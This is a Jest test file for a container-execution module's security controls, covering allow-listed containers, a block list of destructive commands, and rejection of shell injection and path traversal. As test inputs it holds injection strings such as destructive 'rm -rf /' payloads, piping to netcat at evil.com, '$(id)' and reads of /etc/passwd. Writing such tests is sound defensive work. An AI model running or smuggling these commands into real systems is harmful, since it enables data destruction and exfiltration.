/**
 * Tests for exec.js security hardening
 * Run with: npm test -- exec.security.test.js
 * 
 * These tests verify the security controls for container execution:
 * - Container name validation
 * - Command injection prevention
 * - Blocked command filtering
 * - Input sanitization
 * - Timeout enforcement
 */

const {
  execInContainer,
  getRunningContainers,
  shell,
  ALLOWED_CONTAINERS,
  BLOCKED_COMMANDS,
  validateAllowedContainer,
  validateCommand,
  isContainerRunning,
} = require('../lib/exec');

const { DockerSecurityError } = require('../lib/docker');

// Mock chalk to avoid ANSI codes in tests
jest.mock('chalk', () => ({
  red: (str) => str,
  yellow: (str) => str,
  green: (str) => str,
  cyan: (str) => str,
  gray: (str) => str,
  bold: (str) => str,
  blue: (str) => str,
}));

// Mock audit module
jest.mock('../lib/audit', () => ({
  logAuditEvent: jest.fn().mockResolvedValue(true),
}));

// Mock child_process
jest.mock('child_process', () => ({
  spawn: jest.fn(),
}));

const { spawn } = require('child_process');

// =============================================================================
// Helper Functions for Mocking
// =============================================================================

function createMockProcess(exitCode = 0, stdout = '', stderr = '') {
  const mockProcess = {
    stdout: { on: jest.fn() },
    stderr: { on: jest.fn() },
    on: jest.fn(),
    kill: jest.fn(),
  };

  // Simulate stdout data events
  mockProcess.stdout.on.mockImplementation((event, callback) => {
    if (event === 'data' && stdout) {
      callback(Buffer.from(stdout));
    }
  });

  // Simulate stderr data events  
  mockProcess.stderr.on.mockImplementation((event, callback) => {
    if (event === 'data' && stderr) {
      callback(Buffer.from(stderr));
    }
  });

  // Simulate close event
  mockProcess.on.mockImplementation((event, callback) => {
    if (event === 'close') {
      setTimeout(() => callback(exitCode), 0);
    }
    if (event === 'error') {
      // Don't call error by default
    }
  });

  return mockProcess;
}

// =============================================================================
// Container Validation Tests
// =============================================================================

describe('validateAllowedContainer', () => {
  test('accepts allowed container names', () => {
    for (const container of ALLOWED_CONTAINERS) {
      expect(() => validateAllowedContainer(container)).not.toThrow();
      // Function returns undefined on success (no throw)
    }
  });

  test('rejects containers not in allowed list', () => {
    const disallowedContainers = [
      'evil-container',
      'other-service',
      'mc-database',
      'my-app',
      '',
    ];

    for (const container of disallowedContainers) {
      expect(() => validateAllowedContainer(container)).toThrow(DockerSecurityError);
    }
  });

  test('error includes allowed containers list', () => {
    try {
      validateAllowedContainer('evil-container');
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('CONTAINER_NOT_ALLOWED');
      expect(err.details.container).toBe('evil-container');
      expect(err.details.allowed).toEqual(Array.from(ALLOWED_CONTAINERS));
    }
  });

  test('rejects container name with path traversal', () => {
    const traversalAttempts = [
      '../etc/passwd',
      'mc-core/../../../etc',
      'mc-core;rm -rf /',
    ];

    for (const container of traversalAttempts) {
      expect(() => validateAllowedContainer(container)).toThrow(DockerSecurityError);
    }
  });

  test('rejects non-string container names', () => {
    expect(() => validateAllowedContainer(null)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer(undefined)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer(123)).toThrow(DockerSecurityError);
    expect(() => validateAllowedContainer({})).toThrow(DockerSecurityError);
  });
});

// =============================================================================
// Command Validation Tests
// =============================================================================

describe('validateCommand', () => {
  test('accepts valid commands', () => {
    const validCommands = [
      ['ls'],
      ['ls', '-la'],
      ['ls', '-la', '/app'],
      ['cat', '/etc/passwd'],
      ['ps', 'aux'],
      ['python', '--version'],
      ['node', '--version'],
      ['echo', 'hello world'],
    ];

    for (const cmd of validCommands) {
      expect(() => validateCommand(cmd)).not.toThrow();
      // Function returns undefined on success (no throw)
    }
  });

  test('rejects non-array commands', () => {
    expect(() => validateCommand(null)).toThrow(DockerSecurityError);
    expect(() => validateCommand(undefined)).toThrow(DockerSecurityError);
    expect(() => validateCommand('ls -la')).toThrow(DockerSecurityError);
    expect(() => validateCommand(123)).toThrow(DockerSecurityError);
    expect(() => validateCommand({})).toThrow(DockerSecurityError);
  });

  test('rejects empty command arrays', () => {
    expect(() => validateCommand([])).toThrow(DockerSecurityError);
  });

  test('rejects blocked commands', () => {
    for (const cmd of BLOCKED_COMMANDS) {
      expect(() => validateCommand([cmd])).toThrow(DockerSecurityError);
      expect(() => validateCommand([cmd, '-rf', '/'])).toThrow(DockerSecurityError);
    }
  });

  test('blocked commands error includes command name', () => {
    try {
      validateCommand(['rm', '-rf', '/']);
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('BLOCKED_COMMAND');
      expect(err.details.command).toBe('rm');
    }
  });

  test('rejects commands exceeding maximum length', () => {
    const longArg = 'a'.repeat(5000);
    expect(() => validateCommand(['echo', longArg])).toThrow(DockerSecurityError);
  });

  test('rejects commands with shell injection characters', () => {
    const injectionAttempts = [
      ['ls', ';', 'rm', '-rf', '/'],
      ['ls', '&&', 'cat', '/etc/passwd'],
      ['ls', '|', 'nc', 'evil.com', '9999'],
      ['ls', '`whoami`'],
      ['ls', '$(id)'],
      ['ls', '${IFS}'],
      ['ls', '<', '/etc/passwd'],
      ['ls', '>', '/etc/passwd'],
      ['ls', 'file;rm -rf /'],
    ];

    for (const cmd of injectionAttempts) {
      expect(() => validateCommand(cmd)).toThrow(DockerSecurityError);
    }
  });

  test('command injection error includes problematic argument', () => {
    try {
      validateCommand(['ls', 'file;rm -rf /']);
      fail('Expected DockerSecurityError to be thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('COMMAND_INJECTION_ATTEMPT');
      expect(err.details.argument).toBe('file;rm -rf /');
    }
  });

  test('allows safe special characters in arguments', () => {
    const safeCommands = [
      ['echo', 'hello world'],
      ['echo', 'file-name.txt'],
      ['echo', 'file_name.txt'],
      ['echo', 'path/to/file'],
      ['echo', 'file.name.txt'],
    ];

    for (const cmd of safeCommands) {
      expect(() => validateCommand(cmd)).not.toThrow();
    }
  });
});

// =============================================================================
// execInContainer Security Tests
// =============================================================================

describe('execInContainer Security', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('rejects disallowed containers', async () => {
    await expect(execInContainer({
      container: 'evil-container',
      command: ['ls'],
    })).rejects.toThrow(DockerSecurityError);
  });

  test('rejects blocked commands', async () => {
    // Mock isContainerRunning to return true
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['rm', '-rf', '/'],
    })).rejects.toThrow(DockerSecurityError);
  });

  test('checks if container is running before execution', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, ''); // Container not running
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
    })).rejects.toThrow(DockerSecurityError);
    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
    })).rejects.toThrow("is not running");
  });

  test('rejects invalid working directory with path traversal', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
      workdir: '../../../etc',
    })).rejects.toThrow(DockerSecurityError);
    await expect(execInContainer({
      container: 'mc-core',
      command: ['ls'],
      workdir: '..\\windows\\system32',
    })).rejects.toThrow(DockerSecurityError);
  });

  test('rejects invalid environment variable names', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const invalidEnvVars = [
      { '123VAR': 'value' },
      { 'VAR-NAME': 'value' },
      { 'VAR NAME': 'value' },
      { 'VAR;NAME': 'value' },
      { '': 'value' },
    ];

    for (const env of invalidEnvVars) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        env,
      })).rejects.toThrow(DockerSecurityError);
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        env,
      })).rejects.toThrow('Invalid environment variable name');
    }
  });

  test('accepts valid environment variable names', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    const validEnvVars = [
      { VAR: 'value' },
      { VAR_NAME: 'value' },
      { var123: 'value' },
      { _VAR: 'value' },
      { VAR1_VAR2: 'value' },
    ];

    for (const env of validEnvVars) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['echo', 'test'],
        env,
      })).resolves.toBeDefined();
    }
  });

  test('enforces timeout limits', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      // Return a mock that won't timeout immediately
      const mock = createMockProcess(0, '', '');
      return mock;
    });

    // Should use default timeout when not specified
    await execInContainer({
      container: 'mc-core',
      command: ['echo', 'test'],
    });

    // Verify spawn was called with timeout option
    expect(spawn).toHaveBeenCalled();
    const spawnOptions = spawn.mock.calls[spawn.mock.calls.length - 1][2];
    expect(spawnOptions.timeout).toBeDefined();
    expect(spawnOptions.timeout).toBe(300000); // Default 5 minutes
  });

  test('logs audit event on execution', async () => {
    const { logAuditEvent } = require('../lib/audit');
    
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0, '', '');
    });

    await execInContainer({
      container: 'mc-core',
      command: ['ls', '-la'],
      workdir: '/app',
    });

    expect(logAuditEvent).toHaveBeenCalledWith('container_exec', expect.objectContaining({
      container: 'mc-core',
      command: 'ls -la',
      workdir: '/app',
    }));
  });
});

// =============================================================================
// Shell Security Tests
// =============================================================================

describe('shell Security', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('only allows approved shells', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const allowedShells = ['sh', 'bash', 'ash', 'zsh'];
    
    for (const shellName of allowedShells) {
      await expect(shell('mc-core', shellName)).resolves.toBeDefined();
    }
  });

  test('rejects disallowed shells', async () => {
    const disallowedShells = [
      'powershell',
      'cmd',
      'python',
      'perl',
      'ruby',
      'node',
      '/bin/sh',
    ];

    for (const shellName of disallowedShells) {
      await expect(shell('mc-core', shellName)).rejects.toThrow(DockerSecurityError);
      await expect(shell('mc-core', shellName)).rejects.toThrow('is not allowed');
    }
  });

  test('shell uses interactive and TTY mode', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    await shell('mc-core', 'bash');

    // Check that spawn was called with interactive stdio
    expect(spawn).toHaveBeenCalled();
    const spawnOptions = spawn.mock.calls[spawn.mock.calls.length - 1][2];
    expect(spawnOptions.stdio).toBe('inherit');
  });
});

// =============================================================================
// Integration Security Tests
// =============================================================================

describe('Integration Security Tests', () => {
  beforeEach(() => {
    spawn.mockClear();
  });

  test('prevents command injection through container name', async () => {
    const injectionAttempts = [
      'mc-core; rm -rf /',
      'mc-core && cat /etc/passwd',
      'mc-core | nc evil.com 9999',
      'mc-core$(id)',
      'mc-core`whoami`',
    ];

    for (const container of injectionAttempts) {
      await expect(execInContainer({
        container,
        command: ['ls'],
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('prevents command injection through command arguments', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const injectionAttempts = [
      ['echo', 'hello; rm -rf /'],
      ['echo', 'hello && cat /etc/passwd'],
      ['echo', 'hello | nc evil.com 9999'],
      ['echo', '$(id)'],
      ['echo', '`whoami`'],
    ];

    for (const command of injectionAttempts) {
      await expect(execInContainer({
        container: 'mc-core',
        command,
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('prevents path traversal in workdir', async () => {
    spawn.mockImplementation((cmd, args) => {
      if (cmd === 'docker' && args[0] === 'ps') {
        return createMockProcess(0, 'mc-core');
      }
      return createMockProcess(0);
    });

    const traversalAttempts = [
      '../../../etc',
      '..\\..\\windows\\system32',
      '/app/../../../etc',
      './../../etc',
    ];

    for (const workdir of traversalAttempts) {
      await expect(execInContainer({
        container: 'mc-core',
        command: ['ls'],
        workdir,
      })).rejects.toThrow(DockerSecurityError);
    }
  });

  test('all security errors have proper error codes', () => {
    const tests = [
      { 
        fn: () => validateAllowedContainer('evil-container'), 
        code: 'CONTAINER_NOT_ALLOWED' 
      },
      { 
        fn: () => validateCommand([]), 
        code: 'INVALID_COMMAND_FORMAT' 
      },
      { 
        fn: () => validateCommand(['rm', '-rf', '/']), 
        code: 'BLOCKED_COMMAND' 
      },
      { 
        fn: () => validateCommand(['ls', 'file;rm -rf /']), 
        code: 'COMMAND_INJECTION_ATTEMPT' 
      },
      { 
        fn: () => validateCommand(['echo', 'a'.repeat(5000)]), 
        code: 'COMMAND_TOO_LONG' 
      },
    ];

    for (const test of tests) {
      try {
        test.fn();
        fail(`Expected ${test.code} to be thrown`);
      } catch (err) {
        expect(err.code).toBe(test.code);
      }
    }
  });
});

// =============================================================================
// Constants Tests
// =============================================================================

describe('Security Constants', () => {
  test('ALLOWED_CONTAINERS contains expected values', () => {
    expect(ALLOWED_CONTAINERS.has('mc-core')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-backend')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-gateway')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-chroma')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-interface')).toBe(true);
    expect(ALLOWED_CONTAINERS.has('mc-traefik')).toBe(true);
  });

  test('ALLOWED_CONTAINERS does not contain unexpected values', () => {
    expect(ALLOWED_CONTAINERS.has('other-container')).toBe(false);
    expect(ALLOWED_CONTAINERS.has('')).toBe(false);
  });

  test('BLOCKED_COMMANDS contains dangerous commands', () => {
    expect(BLOCKED_COMMANDS.has('rm')).toBe(true);
    expect(BLOCKED_COMMANDS.has('dd')).toBe(true);
    expect(BLOCKED_COMMANDS.has('mkfs')).toBe(true);
    expect(BLOCKED_COMMANDS.has('fdisk')).toBe(true);
    expect(BLOCKED_COMMANDS.has('format')).toBe(true);
    expect(BLOCKED_COMMANDS.has('shred')).toBe(true);
    expect(BLOCKED_COMMANDS.has('wipe')).toBe(true);
    expect(BLOCKED_COMMANDS.has('del')).toBe(true);
  });

  test('BLOCKED_COMMANDS is comprehensive', () => {
    // Ensure we have at least the minimum expected blocked commands
    const minimumBlocked = ['rm', 'dd', 'mkfs', 'fdisk', 'format'];
    for (const cmd of minimumBlocked) {
      expect(BLOCKED_COMMANDS.has(cmd)).toBe(true);
    }
  });
});

// Export for Jest
module.exports = {
  ALLOWED_CONTAINERS,
  BLOCKED_COMMANDS,
};
